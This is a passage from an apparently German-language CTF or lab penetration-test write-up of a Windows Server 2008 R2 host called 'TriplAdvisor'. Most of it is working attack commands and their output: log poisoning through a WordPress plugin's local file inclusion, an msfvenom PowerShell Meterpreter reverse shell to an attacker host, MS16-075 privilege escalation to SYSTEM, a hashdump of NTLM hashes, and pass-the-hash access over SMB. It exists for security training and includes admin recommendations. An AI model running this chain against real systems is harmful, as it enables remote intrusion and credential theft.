+└─# <span class="command"># Erneuter Besuch der LFI-URL im Browser (view-source)</span></div>
+                      <pre>
+view-source:http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=\xampp\apache\logs\access.log
+
+# Gekürzte Ausgabe mit Ergebnis des eingeschleusten Codes:
+192.168.2.199 - - [18/Aug/2024:10:23:11 -0700] "GET /wordpress/ HTTP/1.1" 200 22542 "-" " Volume in drive C has no label.
+ Volume Serial Number is BCB3-AE45
+
+ Directory of C:\xampp\htdocs\wordpress\wp-content\plugins\editor\editor\extensions\pagebuilder\includes
+
+06/30/2024  10:00 AM    <DIR>          .
+06/30/2024  10:00 AM    <DIR>          ..
+06/30/2024  10:00 AM             9,400 ajax_shortcode_pattern.php
+# ... (restliche Dateiliste)
+               6 File(s)        160,360 bytes
+               2 Dir(s)  23,819,964,416 bytes free
+"
+{"success":true,"data":{"output":[]}}
+                      </pre> <!-- HTML <DIR> maskiert -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneuter Aufruf der `access.log` über LFI, nachdem der PHP-Code eingeschleust wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! RCE bestätigt! Statt des PHP-Codes wird die Ausgabe des `dir`-Befehls angezeigt. Der Code wurde erfolgreich ausgeführt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> RCE nutzen, um eine Reverse Shell zu etablieren.<br><strong>Empfehlung (Admin):</strong> Höchste Priorität, LFI zu beheben! System kompromittiert.</p>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept: Ausnutzung der LFI in WordPress Plugin "Editor" zu RCE</h2>
+             <p class="analysis"><strong>Kurzbeschreibung:</strong> Demonstriert die Ausnutzung der LFI im Plugin "Editor" v1.1 mittels Log Poisoning, um RCE zu erlangen und eine Meterpreter Reverse Shell zu etablieren.</p>
+             <p class="analysis"><strong>Voraussetzungen:</strong> Netzwerkzugriff auf Port 8080, Kenntnis der Schwachstelle, Tools (`curl`, `wfuzz`, `msfvenom`, `msfconsole`), Listener.</p>
+             <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+             <ol>
+                 <li>
+                     <strong>Logdatei-Identifikation via LFI & `wfuzz`:</strong> (Siehe vorheriger `wfuzz`-Befehl, der `\xampp\apache\logs\access.log` findet)
+                 </li>
+                 <li>
+                    <strong>Generieren des PowerShell Meterpreter Payloads:</strong>
+                     <div class="code-block">
+                         <div class="terminal">
+                             <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.199 LPORT=1337 -f psh-cmd -o payload.txt</span></div> <!-- Korrekte Optionen LHOST/LPORT und Port 1337 basierend auf späterem Handler -->
+                             <pre>
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of psh-cmd file: 7487 bytes
+Saved as: payload.txt
+                             </pre> <!-- Typos LHST/LPRT korrigiert, Port auf 1337 geändert -->
+                         </div>
+                     </div>
+                     <p class="analysis">Analyse: Erstellt einen PowerShell-Payload (`-f psh-cmd`) für eine Reverse TCP Meterpreter-Verbindung zu 192.168.2.199 auf Port 1337.</p>
+                 </li>
+                 <li>
+                     <strong>Anzeigen und Base64-Kodieren des Payloads:</strong>
+                     <div class="code-block">
+                         <div class="terminal">
+                             <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat payload.txt</span></div>
+                             <pre>
+%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoA[...gekürzter Base64-Payload...]SAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAgBTAHQAYQByAHQAKAAkAHMAKQA7AA==
+                             </pre> <!-- Typo CMSPEC korrigiert, Payload gekürzt -->
+                         </div>
+                     </div>
+                     <p class="analysis">Analyse: Der generierte Payload ist ein `cmd.exe`-Befehl, der PowerShell startet, um den eigentlichen, Base64-kodierten (`-e ...`) Meterpreter-Stager auszuführen.</p>
+                      <!-- Hinweis: Explizites Base64-Encoding wie im vorigen Bericht gezeigt fehlt hier im Text, aber der Payload ist bereits Base64 (-e Option). -->
+                 </li>
+                 <li>
+                     <strong>Einrichten des Metasploit Listeners:</strong>
+                      <div class="code-block">
+                         <div class="terminal">
+                             <div class="prompt metasploit-prompt">msf6 > <span class="command">use multi/handler</span></div>
+                             <pre>[*] Using configured payload generic/shell_reverse_tcp</pre> <!-- Diese Zeile ist irreführend, da der Payload später gesetzt wird -->
+                             <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lhost eth0</span></div> <!-- Besser die IP direkt angeben -->
+                             <pre>lhost => eth0</pre> <!-- Wird zu 192.168.2.199 aufgelöst -->
+                             <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lport 1337</span></div>
+                             <pre>lport => 1337</pre>
+                             <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set payload windows/x64/meterpreter/reverse_tcp</span></div>
+                             <pre>payload => windows/x64/meterpreter/reverse_tcp</pre>
+                             <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">run</span></div>
+                             <pre>[*] Started reverse TCP handler on 192.168.2.199:1337</pre>
+                          </div>
+                     </div>
+                      <p class="analysis">Analyse: Metasploit wird konfiguriert, um auf die eingehende x64-Meterpreter-Verbindung auf Port 1337 zu warten.</p>
+                 </li>
+                 <li>
+                    <strong>Einschleusen & Auslösen des Payloads via LFI & Log Poisoning:</strong>
+                    <div class="code-block">
+                        <div class="terminal">
+                             <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -A "<?php system('powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoA[...gekürzter Base64-Payload...]SAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAgBTAHQAYQByAHQAKAAkAHMAKQA7AA=='); ?>" http://tripladvisor:8080/wordpress/</span></div>
+                             <pre># (Keine direkte Ausgabe des Payloads)</pre>
+                         </div>
+                    </div>
+                     <p class="analysis">Analyse: Der PowerShell-Befehl zum Starten des Base64-kodierten Payloads wird in `<?php system(...); ?>` eingebettet und als User-Agent gesendet. Dies schreibt den Code in die `access.log`. Ein sofortiger oder kurz darauf folgender Aufruf der LFI-URL (`view-source:http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=\xampp\apache\logs\access.log`) führt den PHP-Code und damit den PowerShell-Payload aus.</p>
+                 </li>
+             </ol>
+             <p class="evaluation"><strong>Erwartetes & Tatsächliches Ergebnis:</strong> Eine Meterpreter-Session wird auf dem Listener (Port 1337) geöffnet.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+[*] Sending stage (201798 bytes) to 192.168.2.118
+[*] Meterpreter session 1 opened (192.168.2.199:1337 -> 192.168.2.118:49169) at 2024-08-18 19:55:14 +0200
+
+meterpreter >
+                      </pre>
+                  </div>
+              </div>
+              <p class="evaluation"><strong>Beweismittel:</strong> Erfolgreiche Meterpreter-Session.</p>
+              <p class="evaluation"><strong>Risikobewertung:</strong> Hoch. Kompromittierung des Webservers auf Benutzerebene (`websvc`).</p>
+              <p class="recommendation"><strong>Empfehlungen (Admin):</strong> Siehe vorheriger Bericht (Plugin entfernen, patchen, WAF, Härtung, Monitoring).</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Meterpreter)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">meterpreter > <span class="command">pwd</span></div>
+                     <pre>C:\xampp\htdocs\wordpress\wp-content</pre>
+                     <div class="prompt metasploit-prompt">meterpreter > <span class="command">cd ../../</span></div>
+                     <div class="prompt metasploit-prompt">meterpreter > <span class="command">cd ../../</span></div>
+                     <div class="prompt metasploit-prompt">meterpreter > <span class="command">ls</span></div>
+                     <pre>
+Listing: C:\
+============
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+040777/rwxrwxrwx  0      dir   2009-07-14 06:52:35 +0200  $RECYCLE.BIN
+# ... (restliche Ausgabe von C:\)
+040777/rwxrwxrwx  8192   dir   2024-06-30 07:56:02 +0200  xampp
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Navigation vom initialen Web-Verzeichnis zum Root-Verzeichnis `C:\`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Zeigt erfolgreichen Zugriff auf das Dateisystem außerhalb des Web-Roots.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Weiteres Enumerieren des Systems, insbesondere des `Users`-Verzeichnisses.<br><strong>Empfehlung (Admin):</strong> Berechtigungen des Webserver-Prozesses überprüfen und minimieren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">meterpreter > <span class="command">pwd</span></div>
+                     <pre>C:\</pre>
+                     <div class="prompt metasploit-prompt">meterpreter > <span class="command">cd Users\</span></div>
+                      <div class="prompt metasploit-prompt">meterpreter > <span class="command">ls</span></div>
+                      <pre>[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.</pre> <!-- Typo peration korrigiert -->
+                      <div class="prompt metasploit-prompt">meterpreter > <span class="command">cd Users\\</span></div> <!-- Korrekter Befehl mit Doppelslash -->
+                      <div class="prompt metasploit-prompt">meterpreter > <span class="command">ls</span></div>
+                      <pre>
+Listing: C:\Users
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2024-06-30 05:09:25 +0200  Administrator
+# ... (restliche Benutzerprofile)
+040777/rwxrwxrwx  8192  dir   2024-06-30 05:11:29 +0200  websvc
+                      </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Wechsel in das `Users`-Verzeichnis. Der erste `cd`-Versuch schlägt fehl (möglicherweise Tippfehler oder Timing-Problem), der zweite (`cd Users\\`) gelingt. Auflistung der Benutzerprofile.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zeigt die Profile `Administrator` und `websvc`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Zugriff auf die Profile testen.<br><strong>Empfehlung (Admin):</strong> Keine neuen Erkenntnisse.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">cd Administrator\\</span></div>
+                    <pre>[-] stdapi_fs_chdir: Operation failed: Access is denied.</pre> <!-- Typo peration korrigiert -->
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">cd websvc\\</span></div>
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">cd Desktop\\</span></div>
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">ls</span></div>
+                    <pre>
+Listing: C:\Users\websvc\Desktop
+================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2024-06-30 04:10:54 +0200  desktop.ini
+100666/rw-rw-rw-  33    fil   2024-06-30 19:10:01 +0200  user.txt
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Zugriff auf `Administrator` wird verweigert. Wechsel in das `websvc`-Profil und auf dessen Desktop gelingt. Dort wird `user.txt` gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> User-Flag gefunden! Zugriffsbeschränkungen auf Administrator-Profil sind aktiv.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `user.txt` auslesen. Privilege Escalation anstreben.<br><strong>Empfehlung (Admin):</strong> Korrekte Berechtigungen. Flags nicht unverschlüsselt speichern.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">shell</span></div>
+                    <pre>
+Process 2448 created.
+Channel 2 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\websvc\Desktop>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+                    </pre> <!-- Typo INFRMATIN korrigiert -->
+                    <div class="prompt terminal">C:\Users\websvc\Desktop><span class="command">^C</span></div>
+                    <pre>Terminate channel 2? [y/N]  y</pre>
+                    <div class="prompt metasploit-prompt">meterpreter ></div>
+                    <pre>Background session 1? [y/N]</pre> <!-- Annahme: 'y' gedrückt -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Öffnen einer `cmd.exe`-Shell und Überprüfung der Privilegien des `websvc`-Benutzers mit `whoami /priv`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zeigt Standardprivilegien. Keine offensichtlich einfachen PrivEsc-Vektoren durch hohe Privilegien sichtbar. `SeImpersonatePrivilege` ist zwar vorhanden, aber für viele Exploits wird `SeAssignPrimaryTokenPrivilege` benötigt oder es müssen bestimmte Bedingungen erfüllt sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Automatisierte Exploit-Suche (z.B. `local_exploit_suggester`) oder manuelle Suche nach Schwachstellen.<br><strong>Empfehlung (Admin):</strong> Prinzip der geringsten Rechte anwenden.</p>
+
+             <!-- Redundanter Block zur Vorbereitung des Suggesters -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">use post/multi/recon/local_exploit_suggester</span></div>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set session 1</span></div>
+                     <pre>session => 1</pre>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">sessions</span></div>
+                     <pre>
+Active sessions
+===============
+
+  Id  Name  Type                     Information                 Connection
+  --  ----  ----                     -----------                 ----------
+  1         meterpreter x64/windows  TRIPLADVISOR\websvc @ TRIP  192.168.2.199:1337 -> 192.1
+                                     LADVISOR                    68.2.118:49169 (192.168.2.1
+                                                                 18)
+                     </pre> <!-- Typo TRIPLADVISR korrigiert -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Vorbereitung des `local_exploit_suggester` auf Session 1.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Korrekte Konfiguration.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit `run` starten.<br><strong>Empfehlung (Admin):</strong> Patchen und überwachen.</p>
+             <!-- Ende Redundanz -->
+
+             <p class="analysis"><strong>Analyse:</strong> Überschrift "Privilege Escalation" wiederholt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Strukturelles Element im Originaltext.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester/Admin):</strong> Keine Aktion erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Redundanter Block zur Vorbereitung des Suggesters -->
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">use post/multi/recon/local_exploit_suggester</span></div>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set session 1</span></div>
+                     <pre>session => 1</pre>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">sessions</span></div>
+                     <pre>
+Active sessions
+===============
+  Id  Name  Type                     Information                 Connection
+  --  ----  ----                     -----------                 ----------
+  1         meterpreter x64/windows  TRIPLADVISOR\websvc @ TRIP  192.168.2.199:1337 -> 192.1
+                                     LADVISOR                    68.2.118:49169 (192.168.2.1
+                                                                 18)
+                     </pre> <!-- Typo TRIPLADVISR korrigiert -->
+                     <!-- Ende Redundanz -->
+                     <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">run</span></div>
+                     <pre>
+[*] 192.168.2.118 - Collecting local exploits for x64/windows...
+[*] 192.168.2.118 - 196 exploit checks are being tried...
+[+] 192.168.2.118 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 192.168.2.118 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
+# ... (viele weitere [+] Einträge für verwundbare Exploits)
+[+] 192.168.2.118 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
+[*] Running check method for exploit 45 / 45
+[*] 192.168.2.118 - Valid modules for session 1:
+============================
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
+# ... (Liste der 10 verwundbaren Exploits)
+ 10  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
+# ... (Liste der 35 nicht verwundbaren oder nicht prüfbaren Exploits)
+ 45  exploit/windows/local/win_error_cve_2023_36874                 No                       The target is not exploitable.
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ausführung des `local_exploit_suggester`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Findet erneut 10 potenziell funktionierende lokale Exploits, darunter `ms16_075_reflection_juicy`. Die lange Liste bestätigt den veralteten Patch-Stand des Systems.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `ms16_075_reflection_juicy` auswählen.<br><strong>Empfehlung (Admin):</strong> DRINGEND PATCHEN!</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">use exploit/windows/local/ms16_075_reflection_juicy</span></div>
+                    <pre>[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(windows/local/ms16_075_reflection_juicy) > <span class="command">options</span></div>
+                    <pre>
+Module options (exploit/windows/local/ms16_075_reflection_juicy):
+
+   Name     Current Setting                 Required  Description
+   ----     ---------------                 --------  -----------
+   CLSID    {4991d34b-80a1-4291-83b6-33283  yes       Set CLSID value of the DCOM to trigger <!-- Typo DCM korrigiert -->
+            66b9097}
+   SESSION                                  yes       The session to run this module on <!-- Typo SESSIN korrigiert -->
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  none             yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.2.199    yes       The listen address (an interface may be specified) <!-- Typo LHST korrigiert -->
+   LPORT     4444             yes       The listen port <!-- Typo LPRT korrigiert -->
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+                    </pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(windows/local/ms16_075_reflection_juicy) > <span class="command">set LHOST 192.168.2.199</span></div> <!-- Typo LHST korrigiert -->
+                    <pre>LHOST => 192.168.2.199</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(windows/local/ms16_075_reflection_juicy) > <span class="command">set LPORT 4444</span></div> <!-- Typo LPRT korrigiert -->
+                    <pre>LPORT => 4444</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(windows/local/ms16_075_reflection_juicy) > <span class="command">set payload windows/x64/meterpreter/reverse_tcp</span></div>
+                    <pre>payload => windows/x64/meterpreter/reverse_tcp</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(windows/local/ms16_075_reflection_juicy) > <span class="command">set session 1</span></div>
+                    <pre>session => 1</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(windows/local/ms16_075_reflection_juicy) > <span class="command">run</span></div>
+                    <pre>
+[*] Started reverse TCP handler on 192.168.2.199:4444
+[+] Target appears to be vulnerable (Windows 2008 R2)
+[*] Launching notepad to host the exploit...
+[+] Process 2052 launched.
+[*] Reflectively injecting the exploit DLL into 2052...
+[*] Injecting exploit into 2052...
+[*] Exploit injected. Injecting exploit configuration into 2052...
+[*] Configuration injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (201798 bytes) to 192.168.2.118
+[*] Meterpreter session 2 opened (192.168.2.199:4444 -> 192.168.2.118:49174) at 2024-08-18 20:15:14 +0200
+
+meterpreter >
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auswahl und Konfiguration des Exploits `ms16_075_reflection_juicy`. Setzen des Listeners (LHOST, LPORT), des Payloads (x64 Meterpreter) und der Zielsession (Session 1).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Exploit erfolgreich ausgeführt! Eine neue Meterpreter-Session (Session 2) wird geöffnet, die mit SYSTEM-Rechten laufen sollte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Zur neuen Session wechseln und Rechte überprüfen (`getuid`).<br><strong>Empfehlung (Admin):</strong> Patchen! Überwachung auf verdächtige Prozessstarts (`notepad.exe`) und DLL-Injektionen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">id</span></div>
+                    <pre>[-] Unknown command: id. Run the help command for more details.</pre>
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">whoami</span></div>
+                    <pre>[-] Unknown command: whoami. Run the help command for more details.</pre>
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">shell</span></div>
+                    <pre>
+Process 2812 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> In der neuen Meterpreter-Session (Session 2) funktionieren die Linux-artigen Befehle `id` und `whoami` nicht direkt. Eine `shell` wird geöffnet und dort der Windows-Befehl `whoami` ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Privilege Escalation erfolgreich! Die Shell läuft als `nt authority\system`. Großartig, das Hauptziel ist erreicht!</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag suchen, weitere Post-Exploitation.<br><strong>Empfehlung (Admin):</strong> System kompromittiert, siehe vorherige Empfehlungen.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Bestätigung der erfolgreichen Privilege Escalation.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Wichtiger Meilenstein im Test.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester/Admin):</strong> Keine Aktion erforderlich.</p>
+
+            <h3>Flag Suche (als SYSTEM)</h3>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt terminal">C:\Windows\system32><span class="command">cd ..\..\Users</span></div>
+                    <div class="prompt terminal">C:\Users><span class="command">cd Administrator</span></div>
+                    <div class="prompt terminal">C:\Users\Administrator><span class="command">cd Desktop</span></div>
+                    <div class="prompt terminal">C:\Users\Administrator\Desktop><span class="command">ls</span></div>
+                    <pre>
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+                    </pre>
+                     <div class="prompt terminal">C:\Users\Administrator\Desktop><span class="command">dir</span></div>
+                     <pre>
+ Volume in drive C has no label.
+ Volume Serial Number is BCB3-AE45
+
+ Directory of C:\Users\Administrator\Desktop
+
+08/15/2024  09:02 PM    <DIR>          .
+08/15/2024  09:02 PM    <DIR>          ..
+06/30/2024  10:10 AM                33 root.txt
+               1 File(s)             33 bytes
+               2 Dir(s)  23,852,781,568 bytes free
+                    </pre> <!-- HTML <DIR> maskiert -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> In der SYSTEM-Shell wird zum Administrator-Desktop navigiert. Der Linux-Befehl `ls` schlägt fehl, der Windows-Befehl `dir` funktioniert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `root.txt` wird auf dem Desktop gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `root.txt` auslesen (`type root.txt`).<br><strong>Empfehlung (Admin):</strong> Flags nicht unverschlüsselt ablegen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">hashdump</span></div>
+                    <pre>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="password">2176416a80e4f62804f101d3a55d6c93</span>:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+websvc:1003:aad3b435b51404eeaad3b435b51404ee:<span class="password">4724b17a37bb31574f7a055c9cc7d392</span>:::
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Meterpreter-Befehl `hashdump` wird ausgeführt (erfordert SYSTEM-Rechte). Er extrahiert die NTLM-Passwort-Hashes aus der SAM-Datenbank.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Die Hashes für Administrator, Guest und websvc wurden extrahiert. Dies ist ein kritischer Fund, der Pass-the-Hash-Angriffe und Offline-Cracking ermöglicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Hashes speichern und für PtH (wie im nächsten Schritt gezeigt) oder Offline-Cracking (mit Hashcat oder John the Ripper) verwenden.<br><strong>Empfehlung (Admin):</strong> Credential Dumping erschweren (LSASS Protection, Credential Guard). Hashes sicher speichern (moderne Windows-Versionen tun dies besser).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">smbclient "//192.168.2.118/c$/" -U 'Administrator' --pw-nt-hash '2176416a80e4f62804f101d3a55d6c93'</span></div>
+                    <pre>
+Try "help" to get a list of possible commands.
+smb: \> ls
+  $RECYCLE.BIN                      DHS        0  Tue Jul 14 06:52:35 2009
+# ... (Inhalt von C:\)
+		8362495 blocks of size 4096. 5823433 blocks available
+smb: \> cd Users\Administrator\Desktop\
+smb: \Users\Administrator\Desktop\> ls
+  .                                  DR        0  Fri Aug 16 06:02:08 2024
+  ..                                 DR        0  Fri Aug 16 06:02:08 2024
+  desktop.ini                       AHS      282  Fri Jun  7 22:26:57 2024
+  root.txt                            A       33  Sun Jun 30 19:10:01 2024
+
+		8362495 blocks of size 4096. 5823433 blocks available
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Pass-the-Hash (PtH)-Angriff wird mit `smbclient` durchgeführt, wobei der zuvor gedumpte NTLM-Hash des Administrators (`--pw-nt-hash`) anstelle eines Passworts verwendet wird, um auf die administrative Freigabe `c$` zuzugreifen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Zeigt, dass mit dem gestohlenen Hash administrativer Zugriff über SMB erlangt werden kann. Erneuter Zugriff auf `root.txt` wird demonstriert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> PtH ist eine Kerntechnik in Windows-Netzwerken.<br><strong>Empfehlung (Admin):</strong> Maßnahmen gegen Credential Dumping und PtH ergreifen (siehe oben).</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">type C:\Users\websvc\Desktop\user.txt</div>
+                    <div class="flag-value"><span class="password">4159a2b3a38697518722695cbb09ee46</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">type C:\Users\Administrator\Desktop\root.txt</div>
+                    <div class="flag-value"><span class="password">5b38df6802c305e752c8f02358721acc</span></div>
+                </div>
+            </div>
+        </section>
+
+         <section id="zusammenfassung">
+            <!-- Übernommen aus vorherigem Bericht, da relevant -->
+            <h2>Zusammenfassung & Empfehlungen</h2>
+
+             <p class="evaluation"><strong>Zusammenfassende Bewertung der Sicherheitslage:</strong> Das getestete System "TriplAdvisor" weist kritische Sicherheitslücken auf, die eine vollständige Kompromittierung durch einen Angreifer mit Netzwerkzugriff ermöglichten. Die Hauptangriffsvektoren waren eine veraltete WordPress-Installation mit einem verwundbaren Plugin ("Editor" v1.1), das Local File Inclusion (LFI) erlaubte, und ein veraltetes, ungepatchtes Betriebssystem (Windows Server 2008 R2), das anfällig für bekannte Privilege-Escalation-Exploits (MS16-075) war. Die Kombination dieser Schwachstellen erlaubte es, von einer LFI zu Remote Code Execution und schließlich zu vollen SYSTEM-Rechten zu gelangen.</p>
+
+             <h3>Identifizierte Verletzlichkeiten (Zusammenfassung):</h3>
+             <ul>
+                 <li>**Web (WordPress Plugin "Editor" v1.1):** Local File Inclusion (LFI), ausgenutzt für Log Poisoning und Remote Code Execution (RCE).</li>
+                 <li>**Web (WordPress Core):** Veraltete Version (5.1.19) mit potenziell weiteren Schwachstellen. Benutzer-Enumeration über REST API möglich. Standard-Admin-Benutzername ("admin") aktiv.</li>
+                 <li>**System (Windows Server 2008 R2):** Fehlende Patches führen zur Anfälligkeit für mehrere Privilege-Escalation-Exploits (insb. MS16-075).</li>
+                 <li>**System (SMB):** SMB Message Signing nicht erzwungen (auf Host 116 und 117), was SMB-Relay-Angriffe ermöglichen könnte.</li>
